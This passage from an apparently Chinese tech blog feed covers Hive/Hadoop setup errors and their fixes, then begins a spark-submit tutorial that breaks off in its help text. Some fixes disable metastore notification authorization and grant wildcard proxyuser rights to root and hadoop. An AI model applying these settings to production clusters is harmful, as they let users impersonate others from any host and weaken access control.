sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">        at java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class="line">        at org.apache.hadoop.util.RunJar.run(RunJar.java:323)</span><br><span class="line">        at org.apache.hadoop.util.RunJar.main(RunJar.java:236)</span><br></pre></td></tr></table></figure>
<p>hive中的guava-19.0和hadoop中的guava-27.0冲突，将hive中jar替换即可。</p>
<h2 id="2-system-java-io-tmpdir-7D-7Bsystem-user-name-7D"><a href="#2-system-java-io-tmpdir-7D-7Bsystem-user-name-7D" class="headerlink" title="2. ${system:java.io.tmpdir%7D/$%7Bsystem:user.name%7D"></a>2. ${system:java.io.tmpdir%7D/$%7Bsystem:user.name%7D</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Exception <span class="keyword">in</span> thread <span class="string">"main"</span> java.lang.IllegalArgumentException: java.net.URISyntaxException: Relative path <span class="keyword">in</span> absolute URI: $&#123;system:java.io.tmpdir%7D/$%7Bsystem:user.name%7D</span><br><span class="line">        at org.apache.hadoop.fs.Path.initialize(Path.java:263)</span><br><span class="line">        at org.apache.hadoop.fs.Path.&lt;init&gt;(Path.java:221)</span><br><span class="line">        at org.apache.hadoop.hive.ql.session.SessionState.createSessionDirs(SessionState.java:710)</span><br><span class="line">        at org.apache.hadoop.hive.ql.session.SessionState.start(SessionState.java:627)</span><br><span class="line">        at org.apache.hadoop.hive.ql.session.SessionState.beginStart(SessionState.java:591)</span><br><span class="line">        at org.apache.hadoop.hive.cli.CliDriver.run(CliDriver.java:747)</span><br><span class="line">        at org.apache.hadoop.hive.cli.CliDriver.main(CliDriver.java:683)</span><br><span class="line">        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">        at java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class="line">        at org.apache.hadoop.util.RunJar.run(RunJar.java:323)</span><br><span class="line">        at org.apache.hadoop.util.RunJar.main(RunJar.java:236)</span><br><span class="line">Caused by: java.net.URISyntaxException: Relative path <span class="keyword">in</span> absolute URI: $&#123;system:java.io.tmpdir%7D/$%7Bsystem:user.name%7D</span><br><span class="line">        at java.net.URI.checkPath(URI.java:1822)</span><br><span class="line">        at java.net.URI.&lt;init&gt;(URI.java:745)</span><br><span class="line">        at org.apache.hadoop.fs.Path.initialize(Path.java:260)</span><br></pre></td></tr></table></figure>
<p>修改为指定的目录,/opt/app/hive/tmp/hadoop</p>
<h2 id="3-mysql驱动找不到"><a href="#3-mysql驱动找不到" class="headerlink" title="3. mysql驱动找不到"></a>3. mysql驱动找不到</h2><p>hive初始化的时候报错</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[hadoop@hadoop01 conf]$ schematool -dbType mysql -initSchema</span><br><span class="line">SLF4J: Class path contains multiple SLF4J bindings.</span><br><span class="line">SLF4J: Found binding <span class="keyword">in</span> [jar:file:/opt/hive-3.1.2/lib/log4j-slf4j-impl-2.10.0.jar!/org/slf4j/impl/StaticLoggerBinder.class]</span><br><span class="line">SLF4J: Found binding <span class="keyword">in</span> [jar:file:/opt/hadoop-3.2.2/share/hadoop/common/lib/slf4j-log4j12-1.7.25.jar!/org/slf4j/impl/StaticLoggerBinder.class]</span><br><span class="line">SLF4J: See http://www.slf4j.org/codes.html<span class="comment">#multiple_bindings for an explanation.</span></span><br><span class="line">SLF4J: Actual binding is of <span class="built_in">type</span> [org.apache.logging.slf4j.Log4jLoggerFactory]</span><br><span class="line">Metastore connection URL:        jdbc:mysql://hadoop01:3306/hive</span><br><span class="line">Metastore Connection Driver :    com.mysql.cj.jdbc.Driver</span><br><span class="line">Metastore connection User:       root</span><br><span class="line">org.apache.hadoop.hive.metastore.HiveMetaException: Failed to load driver</span><br><span class="line">Underlying cause: java.lang.ClassNotFoundException : com.mysql.cj.jdbc.Driver</span><br><span class="line">Use --verbose <span class="keyword">for</span> detailed stacktrace.</span><br><span class="line">*** schemaTool failed ***</span><br></pre></td></tr></table></figure>
<p>找不到mysql驱动,但是我已经上传驱动到lib下了。猜测可能是权限的问题，果然查看mysql驱动包的归属用户和组均为root，重新修改为hadoop用户和用户组即可。</p>
<h2 id="4-zookeeper读取配置失败"><a href="#4-zookeeper读取配置失败" class="headerlink" title="4. zookeeper读取配置失败"></a>4. zookeeper读取配置失败</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Connecting to jdbc:hive2://hadoop01:2181,hadoop02:2181,hadoop03:2181/hive;serviceDiscoveryMode=zooKeeper;zooKeeperNamespace=hiveserver2</span><br><span class="line">Enter username <span class="keyword">for</span> jdbc:hive2://hadoop01:2181,hadoop02:2181,hadoop03:2181/hive: root</span><br><span class="line">Enter password <span class="keyword">for</span> jdbc:hive2://hadoop01:2181,hadoop02:2181,hadoop03:2181/hive: ******</span><br><span class="line">Error: org.apache.hive.jdbc.ZooKeeperHiveClientException: Unable to <span class="built_in">read</span> HiveServer2 configs from ZooKeeper (state=,code=0)</span><br></pre></td></tr></table></figure>
<p>hiveserver2启动失败，zk注册失败，检查hiverserver2服务是否正常。</p>
<h2 id="5-URI-does-not-have-a-scheme"><a href="#5-URI-does-not-have-a-scheme" class="headerlink" title="5. URI:  does not have a scheme"></a>5. URI:  does not have a scheme</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Caused by: java.lang.IllegalArgumentException: URI:  does not have a scheme</span><br><span class="line">        at org.apache.hadoop.hive.metastore.HiveMetaStoreClient.resolveUris(HiveMetaStoreClient.java:237) ~[hive-exec-3.1.2.jar:3.1.2]</span><br><span class="line">        at org.apache.hadoop.hive.metastore.HiveMetaStoreClient.&lt;init&gt;(HiveMetaStoreClient.java:182) ~[hive-exec-3.1.2.jar:3.1.2]</span><br><span class="line">        at org.apache.hadoop.hive.ql.metadata.SessionHiveMetaStoreClient.&lt;init&gt;(SessionHiveMetaStoreClient.java:94) ~[hive-exec-3.1.2.jar:3.1.2]</span><br><span class="line">        at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) ~[?:1.8.0_291]</span><br><span class="line">        at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) ~[?:1.8.0_291]</span><br><span class="line">        at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) ~[?:1.8.0_291]</span><br><span class="line">        at java.lang.reflect.Constructor.newInstance(Constructor.java:423) ~[?:1.8.0_291]</span><br><span class="line">        at org.apache.hadoop.hive.metastore.utils.JavaUtils.newInstance(JavaUtils.java:84) ~[hive-exec-3.1.2.jar:3.1.2]</span><br><span class="line">        at org.apache.hadoop.hive.metastore.RetryingMetaStoreClient.&lt;init&gt;(RetryingMetaStoreClient.java:95) ~[hive-exec-3.1.2.jar:3.1.2]</span><br><span class="line">        at org.apache.hadoop.hive.metastore.RetryingMetaStoreClient.getProxy(RetryingMetaStoreClient.java:148) ~[hive-exec-3.1.2.jar:3.1.2]</span><br><span class="line">        at org.apache.hadoop.hive.metastore.RetryingMetaStoreClient.getProxy(RetryingMetaStoreClient.java:119) ~[hive-exec-3.1.2.jar:3.1.2]</span><br><span class="line">        at org.apache.hadoop.hive.ql.metadata.Hive.createMetaStoreClient(Hive.java:4299) ~[hive-exec-3.1.2.jar:3.1.2]</span><br><span class="line">        at org.apache.hadoop.hive.ql.metadata.Hive.getMSC(Hive.java:4367) ~[hive-exec-3.1.2.jar:3.1.2]</span><br><span class="line">        at org.apache.hadoop.hive.ql.metadata.Hive.getMSC(Hive.java:4347) ~[hive-exec-3.1.2.jar:3.1.2]</span><br><span class="line">        at org.apache.hadoop.hive.ql.metadata.Hive.getAllFunctions(Hive.java:4603) ~[hive-exec-3.1.2.jar:3.1.2]</span><br></pre></td></tr></table></figure>
<p>检查配置，这里是因为我的hive-site.xml 配置中多个一个逗号,导致配置文件解析失败。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.metastore.uris<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>thrift://hadoop01:9083,thrift://hadoop02:9083,,thrift://hadoop03:9083<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>Thrift URI for the remote metastore. Used by metastore client to connect to remote metastore.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="6-Error-initializing-notification-event-poll"><a href="#6-Error-initializing-notification-event-poll" class="headerlink" title="6. Error initializing notification event poll"></a>6. Error initializing notification event poll</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">2021-07-20T12:07:28,650  WARN [main] server.HiveServer2: Error starting HiveServer2 on attempt 7, will retry <span class="keyword">in</span> 60000ms</span><br><span class="line">java.lang.RuntimeException: Error initializing notification event poll</span><br><span class="line">        at org.apache.hive.service.server.HiveServer2.init(HiveServer2.java:275) ~[hive-service-3.1.2.jar:3.1.2]</span><br><span class="line">        at org.apache.hive.service.server.HiveServer2.startHiveServer2(HiveServer2.java:1036) [hive-service-3.1.2.jar:3.1.2]</span><br><span class="line">        at org.apache.hive.service.server.HiveServer2.access<span class="variable">$1600</span>(HiveServer2.java:140) [hive-service-3.1.2.jar:3.1.2]</span><br><span class="line">        at org.apache.hive.service.server.HiveServer2<span class="variable">$StartOptionExecutor</span>.execute(HiveServer2.java:1305) [hive-service-3.1.2.jar:3.1.2]</span><br><span class="line">        at org.apache.hive.service.server.HiveServer2.main(HiveServer2.java:1149) [hive-service-3.1.2.jar:3.1.2]</span><br><span class="line">        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_291]</span><br><span class="line">        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[?:1.8.0_291]</span><br><span class="line">        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:1.8.0_291]</span><br><span class="line">        at java.lang.reflect.Method.invoke(Method.java:498) ~[?:1.8.0_291]</span><br><span class="line">        at org.apache.hadoop.util.RunJar.run(RunJar.java:323) [hadoop-common-3.2.2.jar:?]</span><br><span class="line">        at org.apache.hadoop.util.RunJar.main(RunJar.java:236) [hadoop-common-3.2.2.jar:?]</span><br><span class="line">Caused by: java.io.IOException: org.apache.thrift.TApplicationException: Internal error processing get_current_notificationEventId</span><br><span class="line">        at org.apache.hadoop.hive.metastore.messaging.EventUtils<span class="variable">$MSClientNotificationFetcher</span>.getCurrentNotificationEventId(EventUtils.java:75) ~[hive-exec-3.1.2.jar:3.1.2]</span><br></pre></td></tr></table></figure>
<p>修改通知为false。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.metastore.event.db.notification.api.auth<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line">      Should metastore do authorization against database notification related APIs such as get_next_notification.</span><br><span class="line">      If set to true, then only the superusers in proxy settings have the permission</span><br><span class="line">    <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="7-java-lang-NoClassDefFoundError-org-apache-tez-dag-api-TezConfiguration"><a href="#7-java-lang-NoClassDefFoundError-org-apache-tez-dag-api-TezConfiguration" class="headerlink" title="7. java.lang.NoClassDefFoundError: org/apache/tez/dag/api/TezConfiguration"></a>7. java.lang.NoClassDefFoundError: org/apache/tez/dag/api/TezConfiguration</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.lang.NoClassDefFoundError: org/apache/tez/dag/api/TezConfiguration</span><br><span class="line">        at org.apache.hadoop.hive.ql.exec.tez.TezSessionPoolSession$AbstractTriggerValidator.startTriggerValidator(TezSessionPoolSession.java:<span class="number">74</span>) ~[hive-exec-<span class="number">3.1</span>.2.jar:<span class="number">3.1</span>.2]</span><br><span class="line">        at org.apache.hadoop.hive.ql.exec.tez.TezSessionPoolManager.initTriggers(TezSessionPoolManager.java:<span class="number">207</span>) ~[hive-exec-<span class="number">3.1</span>.2.jar:<span class="number">3.1</span>.2]</span><br><span class="line">        at org.apache.hadoop.hive.ql.exec.tez.TezSessionPoolManager.startPool(TezSessionPoolManager.java:<span class="number">114</span>) ~[hive-exec-<span class="number">3.1</span>.2.jar:<span class="number">3.1</span>.2]</span><br><span class="line">        at org.apache.hive.service.server.HiveServer2.initAndStartTezSessionPoolManager(HiveServer2.java:<span class="number">839</span>) ~[hive-service-<span class="number">3.1</span>.2.jar:<span class="number">3.1</span>.2]</span><br><span class="line">        at org.apache.hive.service.server.HiveServer2.startOrReconnectTezSessions(HiveServer2.java:<span class="number">822</span>) ~[hive-service-<span class="number">3.1</span>.2.jar:<span class="number">3.1</span>.2]</span><br><span class="line">        at org.apache.hive.service.server.HiveServer2.access$<span class="number">700</span>(HiveServer2.java:<span class="number">140</span>) ~[hive-service-<span class="number">3.1</span>.2.jar:<span class="number">3.1</span>.2]</span><br><span class="line">        at org.apache.hive.service.server.HiveServer2$HS2LeaderLatchListener.isLeader(HiveServer2.java:<span class="number">775</span>) ~[hive-service-<span class="number">3.1</span>.2.jar:<span class="number">3.1</span>.2]</span><br><span class="line">        at org.apache.curator.framework.recipes.leader.LeaderLatch$<span class="number">9</span>.apply(LeaderLatch.java:<span class="number">652</span>) ~[curator-recipes-<span class="number">2.12</span>.0.jar:?]</span><br><span class="line">        at org.apache.curator.framework.recipes.leader.LeaderLatch$<span class="number">9</span>.apply(LeaderLatch.java:<span class="number">648</span>) ~[curator-recipes-<span class="number">2.12</span>.0.jar:?]</span><br><span class="line">        at org.apache.curator.framework.listen.ListenerContainer$<span class="number">1</span>.run(ListenerContainer.java:<span class="number">93</span>) ~[curator-framework-<span class="number">2.12</span>.0.jar:?]</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:<span class="number">1149</span>) ~[?:<span class="number">1.8</span>.0_291]</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:<span class="number">624</span>) ~[?:<span class="number">1.8</span>.0_291]</span><br><span class="line">        at java.lang.Thread.run(Thread.java:<span class="number">748</span>) [?:<span class="number">1.8</span>.0_291]</span><br><span class="line">Caused by: java.lang.ClassNotFoundException: org.apache.tez.dag.api.TezConfiguration</span><br><span class="line">        at java.net.URLClassLoader.findClass(URLClassLoader.java:<span class="number">382</span>) ~[?:<span class="number">1.8</span>.0_291]</span><br><span class="line">        at java.lang.ClassLoader.loadClass(ClassLoader.java:<span class="number">418</span>) ~[?:<span class="number">1.8</span>.0_291]</span><br><span class="line">        at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:<span class="number">355</span>) ~[?:<span class="number">1.8</span>.0_291]</span><br><span class="line">        at java.lang.ClassLoader.loadClass(ClassLoader.java:<span class="number">351</span>) ~[?:<span class="number">1.8</span>.0_291]</span><br></pre></td></tr></table></figure>
<p>缺少tez的配置，虽然没有使用但是也报了这个错。下载并添加以下依赖。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tez<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tez-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tez<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tez-dag<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="8-User-hadoop-is-not-allowed-to-impersonate-root"><a href="#8-User-hadoop-is-not-allowed-to-impersonate-root" class="headerlink" title="8. User: hadoop is not allowed to impersonate root"></a>8. User: hadoop is not allowed to impersonate root</h1><p>beeline启动后，输入连接命令但是会抛出这个异常。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">Caused by: java.lang.RuntimeException: org.apache.hadoop.ipc.RemoteException(org.apache.hadoop.security.authorize.AuthorizationException): User: hadoop is not allowed to impersonate root</span><br><span class="line">        at org.apache.hadoop.hive.ql.session.SessionState.start(SessionState.java:651) ~[hive-exec-3.1.2.jar:3.1.2]</span><br><span class="line">        at org.apache.hadoop.hive.ql.session.SessionState.start(SessionState.java:586) ~[hive-exec-3.1.2.jar:3.1.2]</span><br><span class="line">        at org.apache.hive.service.cli.session.HiveSessionImpl.open(HiveSessionImpl.java:179) ~[hive-service-3.1.2.jar:3.1.2]</span><br><span class="line">        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_291]</span><br><span class="line">        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[?:1.8.0_291]</span><br><span class="line">        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:1.8.0_291]</span><br><span class="line">        at java.lang.reflect.Method.invoke(Method.java:498) ~[?:1.8.0_291]</span><br><span class="line">        at org.apache.hive.service.cli.session.HiveSessionProxy.invoke(HiveSessionProxy.java:78) ~[hive-service-3.1.2.jar:3.1.2]</span><br><span class="line">        at org.apache.hive.service.cli.session.HiveSessionProxy.access$000(HiveSessionProxy.java:36) ~[hive-service-3.1.2.jar:3.1.2]</span><br><span class="line">        at org.apache.hive.service.cli.session.HiveSessionProxy$1.run(HiveSessionProxy.java:63) ~[hive-service-3.1.2.jar:3.1.2]</span><br><span class="line">        at java.security.AccessController.doPrivileged(Native Method) ~[?:1.8.0_291]</span><br><span class="line">        at javax.security.auth.Subject.doAs(Subject.java:422) ~[?:1.8.0_291]</span><br><span class="line">        at org.apache.hadoop.security.UserGroupInformation.doAs(UserGroupInformation.java:1762) ~[hadoop-common-3.2.2.jar:?]</span><br><span class="line">        at org.apache.hive.service.cli.session.HiveSessionProxy.invoke(HiveSessionProxy.java:59) ~[hive-service-3.1.2.jar:3.1.2]</span><br><span class="line">        at com.sun.proxy.$Proxy48.open(Unknown Source) ~[?:?]</span><br><span class="line">        at org.apache.hive.service.cli.session.SessionManager.createSession(SessionManager.java:425) ~[hive-service-3.1.2.jar:3.1.2]</span><br><span class="line">        ... 13 more</span><br><span class="line">Caused by: org.apache.hadoop.ipc.RemoteException: User: hadoop is not allowed to impersonate root</span><br><span class="line">        at org.apache.hadoop.ipc.Client.getRpcResponse(Client.java:1562) ~[hadoop-common-3.2.2.jar:?]</span><br><span class="line">        at org.apache.hadoop.ipc.Client.call(Client.java:1508) ~[hadoop-common-3.2.2.jar:?]</span><br><span class="line">        at org.apache.hadoop.ipc.Client.call(Client.java:1405) ~[hadoop-common-3.2.2.jar:?]</span><br><span class="line">        at org.apache.hadoop.ipc.ProtobufRpcEngine$Invoker.invoke(ProtobufRpcEngine.java:233) ~[hadoop-common-3.2.2.jar:?]</span><br><span class="line">        at org.apache.hadoop.ipc.ProtobufRpcEngine$Invoker.invoke(ProtobufRpcEngine.java:118) ~[hadoop-common-3.2.2.jar:?]</span><br><span class="line">        at com.sun.proxy.$Proxy29.getFileInfo(Unknown Source) ~[?:?]</span><br><span class="line">        at org.apache.hadoop.hdfs.protocolPB.ClientNamenodeProtocolTranslatorPB.getFileInfo(ClientNamenodeProtocolTranslatorPB.java:910) ~[hadoop-hdfs-client-3.2.2.jar:?]</span><br><span class="line">        at sun.reflect.GeneratedMethodAccessor3.invoke(Unknown Source) ~[?:?]</span><br><span class="line">        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:1.8.0_291]</span><br><span class="line">        at java.lang.reflect.Method.invoke(Method.java:498) ~[?:1.8.0_291]</span><br><span class="line">        at org.apache.hadoop.io.retry.RetryInvocationHandler.invokeMethod(RetryInvocationHandler.java:422) ~[hadoop-common-3.2.2.jar:?]</span><br></pre></td></tr></table></figure>
<p>在hadoop的core-site.xml中新增以下配置，表示hadoop和root的代理用户/组可以访问hadoop。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.proxyuser.root.hosts<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>*<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.proxyuser.root.groups<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>*<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.proxyuser.hadoop.hosts<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>*<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.proxyuser.hadoop.groups<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>*<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>hive</tag>
      </tags>
  </entry>
  <entry>
    <title>spark-submit提交任务</title>
    <url>/2019/04/15/%E5%A4%A7%E6%95%B0%E6%8D%AE/spark-submit%E6%8F%90%E4%BA%A4%E4%BB%BB%E5%8A%A1/</url>
    <content><![CDATA[<p>先新建一个 workcount 任务:</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xwolf.bigdata</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.spark.<span class="type">SparkContext</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * spark wordcount.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @author xwolf</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">WordCount</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>().textFile(<span class="string">"README.md"</span>).flatMap(_.split(<span class="string">" "</span>)).map(w =&gt; (w,<span class="number">1</span>)).reduceByKey(_+_).collect()</span><br><span class="line">    sc.foreach(println)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>打包成 jar,上传至服务器中.</p>
<a id="more"></a>
<p>spark-sumit 是通过 jar 将任务提交到集群运行.<br>常用的参数如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@hadoop01 bigdata]<span class="comment"># spark-submit</span></span><br><span class="line">Usage: spark-submit [options] &lt;app jar | python file | R file&gt; [app arguments]</span><br><span class="line">Usage: spark-submit --<span class="built_in">kill</span> [submission ID] --master [spark://...]</span><br><span class="line">Usage: spark-submit --status [submission ID] --master [spark://...]</span><br><span class="line">Usage: spark-submit run-example [options] example-class [example args]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --master MASTER_URL         spark://host:port, mesos://host:port, yarn,</span><br><span class="line">                              k8s://https://host:port, or <span class="built_in">local</span> (Default: <span class="built_in">local</span>[*]).</span><br><span class="line">  --deploy-mode DEPLOY_MODE   Whether to launch the driver program locally (<span class="string">"client"</span>) or</span><br><span class="line">                              on one of the worker machines inside the cluster (<span class="string">"cluster"</span>)</span><br><span class="line">                              (Default: client).</span><br><span class="line">  --class CLASS_NAME          Your application<span class="string">'s main class (for Java / Scala apps).</span></span><br><span class="line"><span class="string">  --name NAME                 A name of your application.</span></span><br><span class="line"><span class="string">  --jars JARS                 Comma-separated list of jars to include on the driver</span></span><br><span class="line"><span class="string">                              and executor classpaths.</span></span><br><span class="line"><span class="string">  --packages                  Comma-separated list of maven coordinates of jars to include</span></span><br><span class="line"><span class="string">                              on the driver and executor classpaths. Will search the local</span></span><br><span class="line"><span class="string">                              maven repo, then maven central and any additional remote</span></span><br><span class="line"><span class="string">                              repositories given by --repositories. The format for the</span></span><br><span class="line"><span class="string">                              coordinates should be groupId:artifactId:version.</span></span><br><span class="line"><span class="string">  --exclude-packages          Comma-separated list of groupId:artifactId, to exclude while</span></span><br><span class="line"><span class="string">                              resolving the dependencies provided in --packages to avoid</span></span><br><span class="line"><span class="string">                              dependency conflicts.</span></span><br><span class="line"><span class="string">  --repositories              Comma-separated list of additional remote repositories to</span></span><br><span class="line"><span class="string">                              search for the maven coordinates given with --packages.</span></span><br><span class="line"><span class="string">  --py-files PY_FILES         Comma-separated list of .zip, .egg, or .py files to place</span></span><br><span class="line"><span class="string">                              on the PYTHONPATH for Python apps.</span></span><br><span class="line"><span class="string">  --files FILES               Comma-separated list of files to be placed in the working</span></span><br><span class="line"><span class="string">                              directory of each executor. File paths of these files</span></span><br><span class="line"><span class="string">                              in executors can be accessed via SparkFiles.get(fileName).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  --conf PROP=VALUE           Arbitrary Spark configuration property.</span></span><br><span class="line"><span class="string">  --properties-file FILE      Path to a file from which to load extra properties. If not</span></span><br><span class="line"><span class="string">                              specified, this will look for conf/spark-defaults.conf.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  --driver-memory MEM         Memory for driver (e.g. 1000M, 2G) (Default: 1024M).</span></span><br><span class="line"><span class="string">  --driver-java-options       Extra Java options to pass to the driver.</span></span><br><span class="line"><span class="string">  --driver-library-path       Extra library path entries to pass to the driver.</span></span><br><span class="line"><span class="string">  --driver-class-path         Extra class path entries to pass to the driver. Note that</span></span><br><span class="line"><span class="string">                              jars added with --jars are automatically included in the</span></span><br><span class="line"><span class="string">                              classpath.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  --executor-memory MEM       Memory per executor (e.g. 1000M, 2G) (Default: 1G).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  --proxy-user NAME           User to impersonate when submitting the application.</span></span><br><span class="line"><span class="string">                              This argument does not work with --principal / --keytab.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  --help, -h                  Show this help message and exit.</span></span><br><span class="line"><span class="string">  --verbose, -v               Print additional debug output.</span></span><br><span class="line"><span class="string">  --version,                  Print the version of current Spark.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> Cluster deploy mode only:</span></span><br><span class="line"><span class="string">  --driver-cores NUM          Number of cores used by the driver, only in cluster mode</span></span><br><span class="line"><span class="string">                              (Default: 1).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> Spark standalone or Mesos with cluster deploy mode only:</span></span><br><span class="line"><span class="string">  --supervise                 If given, restarts the driver on failure.</span></span><br><span class="line"><span class="string">  --kill SUBMISSION_ID        If given, kills the driver specified.</span></span><br><span class="line"><span class="string">  --status SUBMISSION_ID      If given, requests the status of the driver specified.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> Spark standalone and Mesos only:</span></span><br><span class="line"><span class="string">  